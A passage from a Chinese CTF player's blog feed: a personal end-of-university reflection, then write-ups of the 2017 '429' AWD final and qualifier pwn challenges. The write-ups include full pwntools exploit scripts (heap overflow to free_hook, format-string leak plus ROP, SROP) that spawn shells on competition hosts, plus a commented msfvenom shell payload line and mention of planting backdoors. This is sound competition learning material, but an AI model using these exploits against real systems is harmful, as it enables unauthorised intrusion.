    </entry>
    
    <entry>
      <title><![CDATA[墨色的五月]]></title>
      <url>/2017/06/03/%E5%A2%A8%E8%89%B2%E7%9A%84%E4%BA%94%E6%9C%88/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是很久没更新博客了，毕竟我比较懒 = =。。。</p>
<p>这个月基本上没怎么做练习，去了趟北京被web狗吊打了ORZ。。。TCTF又被pwn题目吊打了，自身的实力距离国外强队的实力还是很大的（摊手）。</p>
<p>最近一段时间把毕业答辩、毕业设计、毕业论文等等等等等关于毕业的事情搞定啦。</p>
<p>比赛的话，最近还有两个比赛项目，一个是铁人、一个是jz的选拔赛。</p>
<p>总觉得自己应该在其他方面加强一点了，pwn的实力与其他方面的实力差太多太多了。</p>
<p>1、 加强数据流量分析能力（应对铁人三项，参考科赛</p>
<p>2、 加强web安全攻防能力（应对jz选拔赛，可以从vulhub、pwnhub学习</p>
<a id="more"></a>
<p>一直以来喜欢低调，喜静，喜欢自己默默做自己的事情，可能与我自身性格有关吧。今后也同样如此，沉心静气。</p>
<h3 id="5月的碎碎念"><a href="#5月的碎碎念" class="headerlink" title="5月的碎碎念"></a>5月的碎碎念</h3><p>大学四年的最后一个月了，今后就要步入职场，而我基本上也完成了我进这所学院时的初衷，在这所大学建立一个安全团队，为对安全技术有兴趣的人提供一个平台（当然这些事，我一个人肯定是完成不了的，多亏了斯进老师一直以来的支持，最想感谢的人就是她啦）。大学这四年谈过一次恋爱，虽然短短3个月，不过至少这门必修课给我个及格分吧ORZ。做过一些科研，虽然很难去坚持做（毕竟懒癌晚期患者，没救了）。拿过一些比赛的最高名次，其实CTF比赛不难的，心态和运气才是关键（hhhhhhhh），接下来也要做一些ctf比赛的总结了（我竟然从没做过ORZ 。 说实话这个月在临安不用集合真的是太爽了= =。。。   也是到了该离开的时候了，团队已经带起来了，师弟们的实力都很棒（团队里都是男生，我也很绝望啊，期待有个对网络安全感兴趣的女生加入吧，女黑客ORZ）。今后的话，会一直对二进制进行研究，这是我的强项，虽然工作上可能web为主吧，不过无所谓了。</p>
<h3 id="一些未更新的wp"><a href="#一些未更新的wp" class="headerlink" title="一些未更新的wp"></a>一些未更新的wp</h3><p>1、cuit writeup （看下web题</p>
<p>2、0ctf writeup</p>
<p>3、堆溢出的总结</p>
<h3 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h3><p>1、刷完pwnable</p>
<p>2、刷完最近的web赛题</p>
<p>3、深入web代码审计</p>
]]></content>
      
        
        <tags>
            
            <tag> note </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】2017-429final]]></title>
      <url>/2017/04/27/2017-429-final/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>下次pwn选手真的不该去429线下。。这BGM神TM的= =。。</p>
<p>比赛很稳，主队拿了第7，分队第12，不过需要反思的是：</p>
<p>1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）</p>
<p>2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。</p>
<p>3、写好的exp脚本交由负责流量审计的队友来维护</p>
<p>4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。</p>
<p>5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag</p>
<p>6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。</p>
<p>7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手</p>
<p>8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ</p>
<p>进入主题吧</p>
<a id="more"></a>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>第一个开放的题目是pwn2，9点开放的比赛，我在10点10分左右已经将具体利用思路构思完毕（静态分析30分钟+动态分析40分钟），坑爹的是对libc文件进行分析的时候（因为我需要拿到free_hook的地址），IDA无法静态分析，这边消耗了两个小时，写完exp的时候已经是领盒饭12点了。。别人利用这个pwn2已经打了至少18轮，900分。。</p>
<p>pwn2是一个具有off by one和常规溢出漏洞的二进制程序，他创建的虚表结构如下</p>
<p>PTR[0]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p>
<p>PTR[1]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p>
<p>回过头我们看下这个二进制程序 Hashcode 的input函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">sub_4009DB</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Bh] [bp-5h]@2</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v3 = getchar();</div><div class="line">    <span class="keyword">if</span> ( i == a2 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> i;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>记得大一教我C语言的老师说过，C下标的索引是从0开始的,所以a[len(a)]=0 这样的形式会造成1个\x00字节越界赋值。正常来说，这样1个\x00字节，最多覆盖下一个虚表结构的preg_size的结构，但是存在另一个溢出漏洞，我们可以将hashcode的长度可输入长度进行修改（注意，hashcode的可输入区域长度没有变化），这便造成了越界溢出，溢出的数据覆盖到了下一个ptr虚表，利用过程如下（这个利用过程其实没有用到off by one）。</p>
<ul>
<li>以下版本没有用off by one 漏洞</li>
</ul>
<p>1、创建四个0x20的hashcode</p>
<p>2、修改ptr[0]的hacode length 0x20至0x40</p>
<p>3、覆盖ptr[1]表项，复写ptr[1]表项的hashcode length至我们可以复写ptr[2]表项指向hashcode的指针，复写name指针，利用其我们可以泄露出libc地址。</p>
<p>4、list出所有ptr表项，得到libc地址</p>
<p>5、复写下下一个ptr表项指向hashcode指针，使其指向libc bss段上的free_hook，然后调用edit hashcode，修改 free_hook使其指向system</p>
<p>^以上的供读者自己实现，哈哈哈哈哈哈，我用的是比较麻烦的一个版本</p>
<p>用到off by one 的版本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 18:28:36</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn2"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.22"</span></div><div class="line">port = <span class="number">5009</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line">elf = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	gdb.attach(p,<span class="string">"b*0x400C73\nc"</span>)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 1 add hashcode 0x20 id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 2 add hashcode 0x20 id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"><span class="comment">## end add hashcode 0x20 id 2</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 3 change hashcode length id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" hash type\n"</span>)</div><div class="line">sl(<span class="string">"sha256"</span>) <span class="comment">#change length 0x20 to 0x40</span></div><div class="line"></div><div class="line"><span class="comment">## stage 4 edit hashcode</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span><span class="number">-1</span>)+p64(<span class="number">0</span>)</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 5 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 6 leak system addr </span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"input pattern\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line">ru(<span class="string">"name="</span>)</div><div class="line"></div><div class="line">puts_addr = u64(ru(<span class="string">"\nhashcode"</span>)[:<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(elf.symbols[<span class="string">"puts"</span>]-elf.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line">free_hook_addr = puts_addr+(<span class="number">0x00000035f79906e8</span> - elf.symbols[<span class="string">"puts"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"free_hook_addr="</span>+hex(free_hook_addr)</div><div class="line"><span class="comment">## edit atoi to system</span></div><div class="line"></div><div class="line"><span class="comment">## stage 7 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x48</span><span class="number">-1</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 8 edit chunk id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x8</span><span class="number">-1</span>)+p64(<span class="number">0</span>)+p64(free_hook_addr)[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 9 edit free_hook to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">sl(p64(system_addr)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line"><span class="comment"># stage 10 system</span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">p.interacive()</div></pre></td></tr></table></figure>
<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>该pwn程序存在两个漏洞，一个是格式化字符串漏洞，一个是栈溢出漏洞，我们可以利用格式化字符串漏洞泄露libc地址，然后利用栈溢出漏洞，构造ropchain，实现shell的获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 21:39:25</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.43"</span></div><div class="line">port = <span class="number">5011</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x0400C84\nc")</span></div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line">payload = <span class="string">"%19$llX"</span></div><div class="line">binhex = binascii.b2a_hex(payload)</div><div class="line"><span class="comment"># print binhex</span></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>*(len(binhex)))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(binhex)</div><div class="line">ru(<span class="string">"sult is: \n"</span>)</div><div class="line"></div><div class="line">libc_start_addr = int(ru(<span class="string">"Please "</span>)[:len(<span class="string">"7f041e5cda"</span>)],<span class="number">16</span>) - <span class="number">240</span></div><div class="line"><span class="comment"># print len(libc_start_addr)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_start_addr="</span>+hex(libc_start_addr)</div><div class="line">libc_base = libc_start_addr - <span class="number">0x1ec20</span></div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line">_binsh = libc_base+<span class="number">0x155e43</span></div><div class="line"><span class="keyword">print</span>  <span class="string">"_binsh="</span>+hex(_binsh)</div><div class="line"><span class="comment"># _binsh = libc_base+0x18C385</span></div><div class="line"></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"urn\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">payload = p64(system_addr)+p64(<span class="number">0</span>)+p64(_binsh)</div><div class="line">payload = binascii.b2a_hex(payload)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x90</span>+payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> AWD </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】2017-429预赛]]></title>
      <url>/2017/04/22/429-2017/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。</p>
<p>不过pwn1和pwn2收获都很大，特别记录下。</p>
<a id="more"></a>
<h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>pwn1很短很强悍~</p>
<p>用到了SROP技术，参考资料</p>
<ul>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li>
<li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="external">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li>
</ul>
<p>elf文件非常小，只有几行指令。使用syscall 0 读取用户的输入至栈中。<br>我们虽然可以控制程序的执行流，但是我们没办法控制寄存器的数值。正常利用条件为：控制rax为59，控制rdi为“/bin/sh”字符串的地址，rip指向syscall。后来想了想，rax的数值可以通过输入的字符数来控制，那么现在我们已经可以控制syscall调用execute了，但是我们却不能控制rdi的数值，这里我们可以利用SROP的技术，对所有寄存器进行重新赋值，使rdi指向“/bin/sh”的地址。然而利用SROP需要以下几个条件。</p>
<p>第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；(√)</p>
<p>第二，需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；（√<br>我们可以通过系统调用 1 write函数，进行栈空间信息泄露）</p>
<p>第三，需要知道<code>syscall</code>指令在内存中的地址(√)；</p>
<p>第四，需要知道<code>sigreturn</code>系统调用的内存地址(我们可以利用系统调用号 15 调用该函数)。</p>
<p>因此条件全部满足的情况下，我们利用SROP技术将rdi覆写，那么我们就可以顺利执行 execve（“/bin/sh”,null.null）;啦。（ps：需要注意的是，send过去的数据要有延迟，不然会认为是在一起的）exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-19 23:10:33</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"amd64"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./smallest"</span></div><div class="line">remote_ip = <span class="string">"106.75.61.55"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	